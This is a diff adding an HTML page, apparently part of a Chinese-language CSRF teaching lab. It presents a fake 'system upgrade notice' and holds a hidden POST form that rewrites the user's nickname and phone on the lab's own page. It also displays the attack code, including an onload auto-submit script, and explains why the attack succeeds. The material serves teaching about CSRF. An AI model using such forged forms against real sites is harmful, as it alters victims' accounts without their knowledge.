@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>系统升级通知</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            max-width: 500px;
+            width: 100%;
+        }
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .header .icon {
+            font-size: 4em;
+            margin-bottom: 15px;
+        }
+        .header h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+        .header p {
+            opacity: 0.95;
+            font-size: 1.1em;
+        }
+        .content {
+            padding: 30px;
+        }
+        .upgrade-box {
+            background: #f0f9ff;
+            border: 2px solid #667eea;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .upgrade-box h2 {
+            color: #667eea;
+            font-size: 1.5em;
+            margin-bottom: 10px;
+        }
+        .upgrade-box p {
+            color: #666;
+            font-size: 1em;
+        }
+        .warning-box {
+            background: #fdf6ec;
+            border: 1px solid #e6a23c;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .warning-box h3 {
+            color: #e6a23c;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .warning-box p {
+            color: #666;
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+        .warning-box ul {
+            margin-left: 20px;
+            color: #666;
+            font-size: 0.9em;
+        }
+        .warning-box li {
+            margin: 5px 0;
+        }
+        .code-section {
+            background: #2d2d2d;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        .code-header {
+            background: #2d2d2d;
+            padding: 12px 15px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #3d3d3d;
+        }
+        .code-header h3 {
+            font-size: 0.9em;
+            font-weight: 500;
+        }
+        .code-header button {
+            background: #764ba2;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85em;
+        }
+        .code-body {
+            padding: 15px;
+            color: #f8f8f2;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            display: none;
+        }
+        .code-body.show {
+            display: block;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            text-decoration: none;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102,126,234,0.4);
+        }
+        .nav-bar {
+            background: #f8f9fa;
+            padding: 12px 20px;
+            border-bottom: 1px solid #e0e0e0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-bar a {
+            color: #666;
+            text-decoration: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            transition: all 0.3s;
+            font-size: 0.9em;
+        }
+        .nav-bar a:hover {
+            background: #764ba2;
+            color: white;
+        }
+        .hidden {
+            display: none;
+        }
+        .success-msg {
+            background: #d4edda;
+            border: 2px solid #67c23a;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #155724;
+            text-align: center;
+        }
+        .success-msg h3 {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="nav-bar">
+            <span style="color: #764ba2; font-weight: 600;">🎯 CSRF攻击演示</span>
+            <a href="../index.php">🏠 返回主页</a>
+        </div>
+        
+        <div class="header">
+            <div class="icon">🔔</div>
+            <h1>系统升级通知</h1>
+            <p>重要安全升级，请立即处理</p>
+        </div>
+        
+        <div class="content">
+            <div class="upgrade-box">
+                <h2>🔐 安全升级</h2>
+                <p>系统正在进行安全升级</p>
+                <p style="color: #999; font-size: 0.85em; margin-top: 10px;">
+                    升级时间：2026-05-29 10:00:00
+                </p>
+            </div>
+            
+            <div class="warning-box">
+                <h3>⚠️ 这是一次CSRF攻击演示</h3>
+                <p>当您看到这个页面时，攻击已经自动执行：</p>
+                <ul>
+                    <li>页面包含一个隐藏的表单</li>
+                    <li>表单数据：昵称 = <strong>"被攻击的用户"</strong></li>
+                    <li>表单数据：电话 = <strong>"13800138000"</strong></li>
+                    <li>JavaScript自动提交表单</li>
+                    <li>您的信息已被修改</li>
+                </ul>
+                <p style="margin-top: 10px; color: #764ba2;">
+                    <strong>请返回演示页面查看信息变化！</strong>
+                </p>
+            </div>
+            
+            <div class="code-section">
+                <div class="code-header">
+                    <h3>💻 核心攻击代码</h3>
+                    <button onclick="toggleCode()">显示/隐藏</button>
+                </div>
+                <div class="code-body" id="codeBody">
+                    <strong style="color: #764ba2;">// POST型CSRF攻击代码</strong><br><br>
+                    &lt;!-- 隐藏的攻击表单 --&gt;<br>
+                    &lt;form id="attackForm" action="csrf_post.php" method="POST" style="display:none"&gt;<br>
+                    &nbsp;&nbsp;&lt;input type="hidden" name="action" value="update_vulnerable"&gt;<br>
+                    &nbsp;&nbsp;&lt;input type="hidden" name="nickname" value="被攻击的用户"&gt;<br>
+                    &nbsp;&nbsp;&lt;input type="hidden" name="phone" value="13800138000"&gt;<br>
+                    &lt;/form&gt;<br><br>
+                    &lt;!-- 自动提交表单 --&gt;<br>
+                    &lt;script&gt;<br>
+                    &nbsp;&nbsp;// 页面加载后自动提交表单<br>
+                    &nbsp;&nbsp;window.onload = function() {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;document.getElementById('attackForm').submit();<br>
+                    &nbsp;&nbsp;};<br>
+                    &lt;/script&gt;<br><br>
+                    <strong style="color: #67c23a;">// 为什么攻击成功？</strong><br>
+                    1. 用户已登录目标网站，浏览器保存了Cookie<br>
+                    2. POST请求自动携带Cookie<br>
+                    3. 目标网站没有CSRF Token验证<br>
+                    4. JavaScript自动提交表单，用户无感知
+                </div>
+            </div>
+            
+            <div id="successMsg" class="success-msg hidden">
+                <h3>✅ 攻击已执行！</h3>
+                <p>您的信息已被修改：</p>
+                <p><strong>昵称：被攻击的用户</strong></p>
+                <p><strong>电话：13800138000</strong></p>
+                <p style="margin-top: 10px; font-size: 0.9em;">
+                    请返回 <a href="csrf_post.php" style="color: #67c23a;">演示页面</a> 查看结果
+                </p>
+            </div>
+            
+            <div style="display: flex; gap: 15px; margin-bottom: 20px;">
+                <button onclick="executeAttack()" class="btn" style="flex: 1;">
+                    🔥 执行攻击演示
+                </button>
+                <a href="csrf_post.php" class="btn" style="flex: 1; background: linear-gradient(135deg, #409eff 0%, #66b1ff 100%);">
+                    📋 返回演示页面
+                </a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- CSRF攻击代码 - 隐藏表单自动提交 -->
+    <form id="attackForm" action="csrf_post.php" method="POST" style="display:none">
+        <input type="hidden" name="action" value="update_vulnerable">
+        <input type="hidden" name="nickname" value="被攻击的用户">
+        <input type="hidden" name="phone" value="13800138000">
+    </form>
+    
+    <script>
+        function toggleCode() {
+            const codeBody = document.getElementById('codeBody');
+            codeBody.classList.toggle('show');
+        }
+        
+        function showSuccess() {
+            document.getElementById('successMsg').classList.remove('hidden');
+        }
+        
+        function executeAttack() {
+            if (confirm('确定要执行攻击演示吗？\n\n攻击将修改您的用户信息，您可以返回演示页面查看结果。')) {
+                document.getElementById('attackForm').submit();
+            }
+        }
+    </script>
+</body>
+</html>
